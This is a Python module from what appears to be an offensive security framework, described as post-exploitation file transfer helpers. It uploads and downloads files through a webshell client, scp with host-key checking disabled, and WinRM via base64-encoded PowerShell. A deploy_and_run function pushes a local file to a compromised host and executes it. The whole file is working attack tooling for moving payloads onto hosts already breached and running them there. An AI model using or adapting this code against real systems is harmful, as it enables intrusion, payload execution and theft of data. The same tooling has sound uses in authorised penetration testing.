"""Remote file transfer helpers for post-exploitation."""

from __future__ import annotations

import base64
import subprocess
from pathlib import Path
from typing import Sequence

from ofx.api.exploitation.webshell.client import WebShellClient

__all__ = [
    "download_via_scp",
    "download_via_webshell",
    "deploy_and_run",
    "upload_via_scp",
    "upload_via_webshell",
    "upload_via_winrm",
]


def upload_via_webshell(client: WebShellClient, local_path: str, remote_path: str) -> str:
    """Upload a file to a remote host via WebShellClient."""
    return client.upload_file(local_path, remote_path)


def download_via_webshell(client: WebShellClient, remote_path: str, local_path: str) -> None:
    """Download a file from a remote host via WebShellClient."""
    return client.download_file(remote_path, local_path)


def upload_via_scp(
    local_path: str,
    remote_path: str,
    host: str,
    user: str | None = None,
    port: int = 22,
    identity_file: str | None = None,
    extra_args: Sequence[str] | None = None,
    timeout: int | None = None,
) -> None:
    """Upload a file to a remote host via scp."""
    cmd = ["scp", "-P", str(port), "-o", "StrictHostKeyChecking=no"]
    if identity_file:
        cmd.extend(["-i", identity_file])
    if extra_args:
        cmd.extend(list(extra_args))
    target = f"{user}@{host}:{remote_path}" if user else f"{host}:{remote_path}"
    cmd.extend([local_path, target])
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout, check=False)
    if result.returncode != 0:
        raise RuntimeError(result.stderr.strip() or f"scp failed: {result.returncode}")


def download_via_scp(
    remote_path: str,
    local_path: str,
    host: str,
    user: str | None = None,
    port: int = 22,
    identity_file: str | None = None,
    extra_args: Sequence[str] | None = None,
    timeout: int | None = None,
) -> None:
    """Download a file from a remote host via scp."""
    cmd = ["scp", "-P", str(port), "-o", "StrictHostKeyChecking=no"]
    if identity_file:
        cmd.extend(["-i", identity_file])
    if extra_args:
        cmd.extend(list(extra_args))
    source = f"{user}@{host}:{remote_path}" if user else f"{host}:{remote_path}"
    cmd.extend([source, local_path])
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout, check=False)
    if result.returncode != 0:
        raise RuntimeError(result.stderr.strip() or f"scp failed: {result.returncode}")


def upload_via_winrm(
    post_winrm,
    local_path: str,
    remote_path: str,
) -> None:
    """Upload a file via a PostWinRM runner using base64 chunks."""
    data = Path(local_path).read_bytes()
    encoded = base64.b64encode(data).decode("ascii")
    post_winrm.run(f"powershell -NoProfile -Command \"$b=[Convert]::FromBase64String('{encoded}');" \
                   f"[IO.File]::WriteAllBytes('{remote_path}', $b)\""
               )


def deploy_and_run(
    runner,
    local_path: str,
    remote_path: str,
    exec_cmd: str | None = None,
) -> str:
    """Upload a local file to remote and execute it.

    Supports PostWebShell, PostSSH, PostWinRM runners by duck-typing.
    """
    if hasattr(runner, "client") and isinstance(runner.client, WebShellClient):
        upload_via_webshell(runner.client, local_path, remote_path)
    elif runner.__class__.__name__ == "PostSSH":
        upload_via_scp(local_path, remote_path, runner.host, runner.user, runner.port, runner.identity_file)
    else:
        # Attempt WinRM upload
        upload_via_winrm(runner, local_path, remote_path)

    command = exec_cmd or remote_path
    return runner.run(command)
